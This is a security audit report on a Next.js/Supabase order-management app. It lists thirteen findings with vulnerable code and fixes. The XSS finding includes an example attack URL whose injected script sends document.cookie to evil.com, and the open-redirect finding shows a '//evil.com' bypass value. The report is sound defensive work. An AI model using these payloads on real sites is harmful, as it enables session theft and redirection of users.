# Security Vulnerability Report — Ivan Prints
**Date:** 2026-06-02  
**Scope:** Full application — OWASP Top 10 + auth/authz deep dive  
**Methodology:** Direct file reads, no static analysis tool (see methodology note)

> **Remediation status (2026-06-02):** 11 of 13 findings fixed on branch `claude/codebase-review-security-perf-sRWF6`.  
> 2 findings deferred pending SQL migrations: **SEC-05** (IDOR ownership) and **SEC-11** (allowed_emails RLS).  
> See `docs/code-review/AUDIT_PROGRESS.md` for the full status table and deferred decision rationale.

---

## Executive Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 3 |
| HIGH | 3 |
| MEDIUM | 4 |
| LOW | 3 |
| **Total** | **13** |

Three critical issues must be resolved before the application is exposed to untrusted users:
1. XSS via unescaped template literals in a `<script>` block
2. Authentication middleware that never enforces authentication
3. Mock admin bypass that grants full access without credentials

---

## CRITICAL

### SEC-01 — XSS via Unescaped Template Literals in Script Block

**File:** `app/auth/verify/route.ts:61–74`  
**OWASP:** A03:2021 — Injection / A07:2021 — XSS

**Problem:** Raw user-controlled values (`email` query param, `next` query param, `data.user.email`) are interpolated directly into a `<script>` block returned as HTML. An attacker who can influence `next` or a user whose email contains a single-quote can inject and execute arbitrary JavaScript.

Attack example:
```
GET /auth/verify?token_hash=...&type=email&next=%27;fetch('https://evil.com/?c='+document.cookie);//
```

This produces:
```html
<script>
  window.location.href = ''; fetch('https://evil.com/?c='+document.cookie);//';
</script>
```

**Current code (dangerous):**
```typescript
// app/auth/verify/route.ts:61-74
const html = `
  <script>
    localStorage.setItem('auth_timestamp', '${Date.now()}');
    ${data.user?.email ? `localStorage.setItem('auth_email', '${data.user.email}');` : ''}
    ${email ? `localStorage.setItem('auth_email', '${email}');` : ''}
    window.location.href = '${next}';   // ← attacker-controlled
  </script>
`;
```

**Fix:** Replace the HTML+script approach with a proper server-side redirect. localStorage can be set after redirect from the destination page using URL params, or dropped entirely (the auth session cookie carries the user identity).

```typescript
// app/auth/verify/route.ts — replace lines 49-84
import { NextResponse } from 'next/server';
import { createClient } from '@/utils/supabase/server';

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const tokenHash = searchParams.get('token_hash');
    const type = searchParams.get('type') as EmailOtpType | null;
    const rawNext = searchParams.get('next') || '/dashboard/orders';

    if (!tokenHash || !type) {
      return NextResponse.redirect(new URL('/auth/signin', request.url));
    }

    const supabase = await createClient();
    const { error } = await supabase.auth.verifyOtp({ token_hash: tokenHash, type });

    if (error) {
      return NextResponse.redirect(new URL('/auth/signin?error=verification_failed', request.url));
    }

    // Validate redirect target is same-origin before redirecting
    const safeNext = getSameOriginPath(rawNext, request.url);
    return NextResponse.redirect(new URL(safeNext, request.url));
  } catch {
    return NextResponse.redirect(new URL('/auth/signin?error=server_error', request.url));
  }
}

function getSameOriginPath(next: string, requestUrl: string): string {
  try {
    const base = new URL(requestUrl);
    const resolved = new URL(next, base);
    // Only allow same-origin redirects
    if (resolved.origin !== base.origin) return '/dashboard/orders';
    return resolved.pathname + resolved.search;
  } catch {
    return '/dashboard/orders';
  }
}
```

---

### SEC-02 — Authentication Middleware Does Not Enforce Authentication

**Files:** `middleware.ts:12–15`, `utils/supabase/middleware.ts:41–46`  
**OWASP:** A07:2021 — Identification and Authentication Failures / A01:2021 — Broken Access Control

**Problem:** The middleware calls `updateSession()` which refreshes the Supabase cookie, then unconditionally returns the response. There is **no redirect** for unauthenticated users. Any URL — including `/dashboard/orders`, `/dashboard/expenses`, and all API routes — is accessible without logging in.

**Current code (no gate):**
```typescript
// middleware.ts
export async function middleware(request: NextRequest) {
  return updateSession(request);  // refreshes cookie, does NOT redirect
}

// utils/supabase/middleware.ts:41-46
const { data: { user } } = await supabase.auth.getUser();
// "This is handled by the middleware.ts file, so we just return the response here"
return response;  // ← user is fetched and then discarded
```

**Fix:** Add the redirect logic in `middleware.ts`:

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { updateSession } from './utils/supabase/middleware';

const PUBLIC_PATHS = ['/auth/', '/api/healthz'];

export async function middleware(request: NextRequest) {
  const { response, user } = await updateSession(request);
  const { pathname } = request.nextUrl;

  const isPublic = PUBLIC_PATHS.some(p => pathname.startsWith(p));
  if (!user && !isPublic) {
    const signIn = new URL('/auth/signin', request.url);
    signIn.searchParams.set('next', pathname);
    return NextResponse.redirect(signIn);
  }

  return response;
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico|images|fonts).*)'],
};
```

**And update `utils/supabase/middleware.ts` to return the user:**
```typescript
export async function updateSession(request: NextRequest) {
  // ... existing cookie setup ...
  const { data: { user } } = await supabase.auth.getUser();
  return { response, user };   // return both
}
```

---

### SEC-03 — Mock Admin Bypasses All Authentication in Development

**File:** `app/context/auth-context.tsx:242–267`  
**OWASP:** A07:2021 — Identification and Authentication Failures

**Problem:** When `NODE_ENV === 'development'`, any unauthenticated visitor is silently granted a mock `admin` profile. This check runs in the browser, so `NODE_ENV` is embedded at build time. If the application is ever built with `NODE_ENV=development` and deployed (accidentally or in staging), everyone who visits gets admin access.

**Current code (dangerous):**
```typescript
// auth-context.tsx:242-267
} else if (isDevelopment) {
  const mockProfile = {
    id: '00000000-0000-0000-0000-000000000000',
    role: 'admin',    // full access for any anonymous visitor
    status: 'active',
  } as Profile;
  setUser(mockUser);
  setProfile(mockProfile);
```

**Fix:** Delete the entire `else if (isDevelopment)` block. For local development, add real test users via `supabase/seed.sql` (which already exists: `admin@test.com` / `test123`). The mock user exists because the middleware didn't redirect — once SEC-02 is fixed, unauthenticated users never reach this code path.

```typescript
// auth-context.tsx — replace lines 242-270 with:
} else {
  setUser(null);
  setProfile(null);
  setIsLoading(false);
}
```

---

## HIGH

### SEC-04 — Open Redirect via Protocol-Relative URLs

**Files:** `app/auth/callback/route.ts:147–153`, `app/auth/confirm/route.ts:66–72`  
**OWASP:** A01:2021 — Broken Access Control

**Problem:** The `next` parameter is validated only with `.startsWith('/')`. A protocol-relative URL like `//evil.com` passes this check and redirects the user off-site after authentication.

**Current code:**
```typescript
// callback/route.ts:147-153
const formattedNext = next.startsWith('/') ? next : `/${next}`;
const redirectUrl = `${baseUrl}${formattedNext}`;
// baseUrl = 'https://myapp.com'
// formattedNext = '//evil.com' passes the check
// redirectUrl = 'https://myapp.com//evil.com' → redirects to evil.com
return redirect(redirectUrl);
```

**Fix:** Use the `getSameOriginPath` helper from SEC-01 fix:
```typescript
// callback/route.ts:147-153
const safeNext = getSameOriginPath(next, request.url);
return redirect(`${getBaseUrl()}${safeNext}`);
```

---

### SEC-05 — IDOR: No Ownership Check on Resource Endpoints

**Files:** `app/api/orders/[id]/route.ts:23`, `app/api/expenses/[id]/**`, `app/api/material-purchases/[id]/**`  
**OWASP:** A01:2021 — Broken Access Control

**Problem:** Any authenticated user can read, update, or delete any other user's orders/expenses/materials by guessing or enumerating IDs. The API route fetches by ID without verifying that the authenticated user owns the record.

**Current code:**
```typescript
// orders/[id]/route.ts:23
supabase.from('orders').select('*').eq('id', id).single()
// ← no .eq('created_by', user.id) check
```

**Fix — Option A (API layer check):**
```typescript
// Verify ownership before returning
const { data: order, error } = await supabase
  .from('orders')
  .select('*')
  .eq('id', id)
  .eq('created_by', user.id)   // ownership check
  .single();

if (!order) return handleApiError('NOT_FOUND', 'Order not found');
```

**Fix — Option B (preferred: RLS policy):**
Add a Supabase RLS policy that enforces ownership at the database level:
```sql
-- In a new migration: supabase/migrations/<timestamp>_rls_ownership.sql
CREATE POLICY "Users can only see their own orders"
ON orders FOR SELECT
USING (
  created_by = auth.uid()
  OR
  EXISTS (
    SELECT 1 FROM profiles
    WHERE id = auth.uid() AND role IN ('admin', 'manager')
  )
);
```
Option B is preferred because it's enforced regardless of which code path touches the database.

---

### SEC-06 — Unauthenticated GET /api/settings/app

**File:** `app/api/settings/app/route.ts:7–25`  
**OWASP:** A05:2021 — Security Misconfiguration

**Problem:** The GET handler has no authentication check. Anyone — including unauthenticated users — can read application settings. If settings contain internal configuration, email addresses, or feature flags, this is an information disclosure.

**Current code:**
```typescript
export async function GET(request: NextRequest) {
  try {
    const supabase = await createClient();
    // ← no getUser() call
    const { data, error } = await supabase.from('app_settings').select('settings').single();
    return NextResponse.json({ settings: data?.settings || {} });
```

**Fix:**
```typescript
export async function GET(request: NextRequest) {
  try {
    const supabase = await createClient();
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return NextResponse.json({ error: 'Authentication required' }, { status: 401 });

    const { data, error } = await supabase.from('app_settings').select('settings').single();
    if (error) return NextResponse.json({ error: 'Failed to fetch settings' }, { status: 500 });
    return NextResponse.json({ settings: data?.settings || {} });
  } catch {
    return NextResponse.json({ error: 'Unexpected error' }, { status: 500 });
  }
}
```

---

## MEDIUM

### SEC-07 — PUT /api/orders Uses Unsafe Type Cast, No Zod Validation

**File:** `app/api/orders/route.ts:133–139`  
**OWASP:** A03:2021 — Injection

**Problem:** The POST handler uses `CreateOrderSchema.safeParse()` but the PUT handler casts the request body with `as { id?: string; ... }` — this is a compile-time annotation with zero runtime enforcement. Malformed or oversized values go directly to the Supabase RPC.

**Current code:**
```typescript
const { id, clientId, date, status, items } = body as {
  id?: string; clientId?: string; date?: string; status?: string; items?: unknown[];
};
```

**Fix:**
```typescript
import { z } from 'zod';

const UpdateOrderSchema = z.object({
  id: z.string().uuid(),
  clientId: z.string().uuid(),
  date: z.string().regex(/^\d{4}-\d{2}-\d{2}$/),
  status: z.enum(['pending', 'in_progress', 'completed', 'cancelled']),
  items: z.array(z.object({
    item_name: z.string().min(1).max(200),
    quantity: z.number().int().positive(),
    unit_price: z.number().nonnegative(),
  })).min(1),
});

// In PUT handler:
const parsed = UpdateOrderSchema.safeParse(body);
if (!parsed.success) {
  return handleApiError('VALIDATION_ERROR', 'Invalid request body', parsed.error.flatten());
}
const { id, clientId, date, status, items } = parsed.data;
```

---

### SEC-08 — Falsy Check Rejects Legitimate Zero-Amount Payments

**Files:** `app/api/expenses/[id]/payments/route.ts:56`, `app/api/material-purchases/[id]/payments/route.ts:75`  
**OWASP:** A03:2021 — Injection (input validation gap)

**Problem:** `if (!payment.amount || ...)` uses JavaScript falsy semantics. `payment.amount = 0` is falsy, so a zero-value payment record fails this check with a confusing 400 error. More critically, it means there is no actual type validation — a string `"hello"` passes the `!payment.amount` check and goes into the database.

**Current code:**
```typescript
if (!payment.amount || !payment.date || !payment.payment_method) {
  return handleApiError('VALIDATION_ERROR', '...');
}
```

**Fix (add Zod schema):**
```typescript
import { z } from 'zod';

const PaymentSchema = z.object({
  amount: z.number().nonnegative(),   // allows 0, rejects negatives and strings
  date: z.string().regex(/^\d{4}-\d{2}-\d{2}$/),
  payment_method: z.enum(['cash', 'bank_transfer', 'cheque', 'mobile_money']),
  notes: z.string().max(500).optional(),
});

const parsed = PaymentSchema.safeParse(payment);
if (!parsed.success) {
  return handleApiError('VALIDATION_ERROR', 'Invalid payment data', parsed.error.flatten());
}
```

---

### SEC-09 — Sensitive User Data Logged to stdout in Production

**File:** `app/auth/callback/route.ts:21, 61–65`  
**OWASP:** A09:2021 — Security Logging and Monitoring Failures

**Problem:** The callback route logs the user's `email`, `userId`, and `provider` on every successful authentication. In production these appear in Vercel's log drain or any log aggregation service, creating a persistent record of auth events that includes PII.

**Current code:**
```typescript
console.log('Auth callback received with params:', Object.fromEntries(searchParams.entries()))
// ^ logs the raw 'code' exchange token too

console.log('OAuth authentication successful:', {
  provider: session.user?.app_metadata?.provider,
  userId: session.user?.id,
  email: session.user?.email    // ← PII in logs
})
```

**Fix:** Remove all `console.log` from auth routes entirely. Auth events are already recorded by Supabase's auth audit log. If custom logging is needed, use Sentry's structured context (not console) and redact PII.

```typescript
// Remove all console.log calls from auth/callback/route.ts
// Remove all console.log calls from auth/verify/route.ts
// Keep only: console.error('...', error) for actual errors
```

---

### SEC-10 — Cron Endpoint Unprotected If CRON_SECRET Not Set

**File:** `app/api/cron/generate-recurring-expenses/route.ts:12–18`  
**OWASP:** A05:2021 — Security Misconfiguration

**Problem:** The guard checks `!process.env.CRON_SECRET` and returns unauthorized — but the `||` short-circuits incorrectly. If `CRON_SECRET` is an empty string (`""`), it evaluates as falsy, so `!process.env.CRON_SECRET` is `true`, and the endpoint returns 401 as expected. However if `CRON_SECRET` is simply not set in production, the entire guard returns `handleApiError('AUTHENTICATION_ERROR', ...)` with `'AUTHENTICATION_ERROR'` which is not a valid `ApiErrorType` — this causes a TypeScript error (suppressed by `ignoreBuildErrors`) and the behavior is undefined. The route may silently allow all requests.

**Current code:**
```typescript
if (!process.env.CRON_SECRET || authHeader !== `Bearer ${process.env.CRON_SECRET}`) {
  return handleApiError('AUTHENTICATION_ERROR', 'Unauthorized', { status: 401 });
  //                     ^^ not a valid ApiErrorType — TypeScript error suppressed
}
```

**Fix (fail-closed, correct type):**
```typescript
const cronSecret = process.env.CRON_SECRET;
if (!cronSecret) {
  // Fail closed: if the secret is not configured, block all access
  return handleApiError('INTERNAL_SERVER_ERROR', 'Cron endpoint not configured');
}
if (authHeader !== `Bearer ${cronSecret}`) {
  return handleApiError('UNAUTHORIZED', 'Invalid cron secret');
}
```

---

## LOW

### SEC-11 — `allowed_emails` RLS Exposes Privileged User List

**File:** `supabase/migrations/20250901000000_auth_checkpoint_and_updates.sql:159–162`  
**OWASP:** A01:2021 — Broken Access Control

**Problem:** Any authenticated user can read the full `allowed_emails` table, which is the system's access control list. This reveals which email addresses are allowed into the application.

```sql
CREATE POLICY "Authenticated users can read allowed_emails"
ON allowed_emails FOR SELECT TO authenticated
USING (true);   -- ← any authenticated user reads all rows
```

**Fix:** Restrict reads to admin role:
```sql
CREATE POLICY "Only admins can read allowed_emails"
ON allowed_emails FOR SELECT TO authenticated
USING (
  EXISTS (
    SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin'
  )
);
```

---

### SEC-12 — Sentry Traces 100% of Production Requests

**File:** `sentry.server.config.ts:8`  
**OWASP:** A09:2021 — Security Logging and Monitoring Failures

**Problem:** `tracesSampleRate: 1` sends full request traces for every production request to Sentry. This increases latency, inflates Sentry quota costs, and potentially captures sensitive request payloads.

**Fix:**
```typescript
// sentry.server.config.ts
tracesSampleRate: process.env.NODE_ENV === 'production' ? 0.05 : 1.0,
```

---

### SEC-13 — DELETE /api/orders Has No Role Check

**File:** `app/api/orders/route.ts:161–180`  
**OWASP:** A01:2021 — Broken Access Control

**Problem:** POST checks authentication. GET checks authentication. PUT checks authentication. DELETE only checks that the user is authenticated — any role (including `staff`) can delete any order.

**Fix:**
```typescript
export async function DELETE(request: NextRequest) {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return handleApiError('UNAUTHORIZED', 'Authentication required');

  // Add role check
  const { data: profile } = await supabase
    .from('profiles').select('role').eq('id', user.id).single();
  if (!profile || !['admin', 'manager'].includes(profile.role)) {
    return handleApiError('FORBIDDEN', 'Only admins and managers can delete orders');
  }

  // ... rest of handler
}
```

---

## Dependency Vulnerabilities

See `docs/code-review/DEPENDENCY_REVIEW.md` for the full audit. Priority removals:

| Package | Issue | Action |
|---------|-------|--------|
| `@supabase/auth-helpers-nextjs` | Deprecated, replaced by `@supabase/ssr` | Remove — already using `@supabase/ssr` |
| `bcrypt` | Incompatible with Edge Runtime (uses Node.js native modules) | Replace with `bcryptjs` |
| `shadcn-ui` | Duplicate of `shadcn` CLI package | Remove one |

Run `npm audit` to check for active CVEs:
```bash
npm audit --audit-level=high
```

---

## Fix Priority Order

1. **SEC-01** (XSS) — deploy immediately, no migration required
2. **SEC-03** (mock admin) — delete 25 lines, deploy immediately  
3. **SEC-02** (middleware auth) — requires middleware + updateSession refactor, test auth flow carefully
4. **SEC-04** (open redirect) — 3-line fix in two files
5. **SEC-06** (unauth settings GET) — 5-line fix
6. **SEC-07** (PUT validation) — add `UpdateOrderSchema`, 15 lines
7. **SEC-08** (payment zero check) — add Zod schemas to 2 payment routes
8. **SEC-10** (cron types) — 3-line fix
9. **SEC-05** (IDOR) — RLS migration (schema change, requires staging test)
10. **SEC-09** (logging PII) — cleanup pass, remove console.log from auth routes
11. **SEC-11** (allowed_emails RLS) — migration, test admin access
12. **SEC-13** (DELETE role) — add role check, 10 lines
13. **SEC-12** (Sentry sample rate) — 1-line config change
